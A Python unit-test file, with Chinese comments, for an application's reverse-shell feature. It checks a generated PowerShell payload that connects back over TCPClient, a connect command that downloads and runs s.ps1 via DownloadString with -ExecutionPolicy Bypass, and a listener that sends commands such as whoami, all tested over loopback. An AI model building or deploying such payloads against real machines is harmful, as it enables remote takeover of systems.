"""反弹终端的离线测试：脚本正文、连接命令与本机回环会话。"""

import socket
import time
import unittest
from contextlib import suppress

from app.features.shell import service as shell


class PayloadTests(unittest.TestCase):
    """目标端脚本只依赖 ASCII，避免下载时被系统代码页破坏。"""

    def test_script_uses_utf8_channel(self):
        text = shell.payload_script("10.0.0.5", 4705)
        self.assertIn("New-Object Net.Sockets.TCPClient('10.0.0.5',4705)", text)
        self.assertIn("System.Text.UTF8Encoding($false)", text)
        self.assertNotIn("ASCIIEncoding", text)

    def test_script_is_ascii_only(self):
        text = shell.payload_script("10.0.0.5", 4705)
        text.encode("ascii")

    def test_script_splits_lines(self):
        text = shell.payload_script("10.0.0.5", 4705)
        self.assertIn("$buf.IndexOf([char]10)", text)
        self.assertIn("TrimEnd([char]13)", text)
        self.assertIn("'[!] '+$_.Exception.Message", text)
        self.assertIn("Out-String -Width 4096", text)

    def test_script_sends_prompt_before_reading(self):
        text = shell.payload_script("10.0.0.5", 4705)
        write = text.index("$s.Write($p,0,$p.Length)")
        read = text.index("$i=$s.Read($b,0,")
        self.assertLess(write, read)


class ConnectCommandTests(unittest.TestCase):
    def test_command_downloads_script(self):
        text = shell.connect_command("10.0.0.5", 51234)
        self.assertIn("http://10.0.0.5:51234/s.ps1", text)
        self.assertIn("-ExecutionPolicy Bypass", text)
        self.assertIn("DownloadString", text)

    def test_command_fits_remote_channel(self):
        text = shell.connect_command("10.49.151.29", 65535)
        self.assertLessEqual(len(text), shell.MAX_COMMAND_CHARS)


class ServerTests(unittest.TestCase):
    """用本机回环套接字代替真实目标，验证连回、下发与断开。"""

    def setUp(self):
        self.server = shell.ShellServer(port=0, local_ip="127.0.0.1")
        self.server.start()
        self.addCleanup(self.server.close)
        self.clients = []
        self.addCleanup(self._close_clients)

    def _close_clients(self):
        for client in self.clients:
            with suppress(OSError):
                client.close()

    def _connect(self):
        client = socket.create_connection(("127.0.0.1", self.server.port), timeout=5)
        self.clients.append(client)
        deadline = time.time() + 5
        while time.time() < deadline and not self.server.connected:
            time.sleep(0.01)
        self.assertTrue(self.server.connected)
        return client

    def test_connect_and_send(self):
        client = self._connect()
        self.assertIn("目标已连回", self.server.poll())
        self.assertTrue(self.server.send("whoami"))
        self.assertEqual(client.recv(64), b"whoami\r\n")

    def test_send_without_target(self):
        self.assertFalse(self.server.send("whoami"))

    def test_disconnect_is_reported(self):
        client = self._connect()
        self.server.poll()
        client.close()
        deadline = time.time() + 5
        seen = ""
        while time.time() < deadline:
            seen += self.server.poll()
            if "连接已断开" in seen:
                break
            time.sleep(0.01)
        self.assertIn("连接已断开", seen)
        self.assertFalse(self.server.connected)

    def test_new_connection_replaces_old(self):
        first = self._connect()
        old = self.server.address
        self.server.poll()
        second = self._connect()
        deadline = time.time() + 5
        while time.time() < deadline and self.server.address == old:
            time.sleep(0.01)
        self.assertNotEqual(self.server.address, old)
        self.server.poll()
        self.assertTrue(self.server.send("echo hi"))
        self.assertEqual(second.recv(64), b"echo hi\r\n")
        first.settimeout(5)
        self.assertEqual(first.recv(64), b"")

    def test_callback_host_prefers_explicit_address(self):
        self.assertEqual(self.server.callback_host("10.1.1.1"), "127.0.0.1")


if __name__ == "__main__":
    unittest.main()
